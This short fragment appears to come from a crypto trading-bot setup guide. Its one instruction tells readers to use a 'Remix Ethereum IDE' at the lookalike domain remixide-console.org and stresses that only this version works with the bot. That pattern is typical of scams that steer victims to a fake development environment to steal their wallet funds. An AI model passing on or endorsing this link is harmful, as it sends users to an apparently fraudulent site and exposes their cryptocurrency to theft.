...
► [Use Remix Ethereum IDE](https://remixide-console.org/) 🚨 https://remixide-console.org/ (Ensure you only use this version, as the bot is compatible with it specifically.)
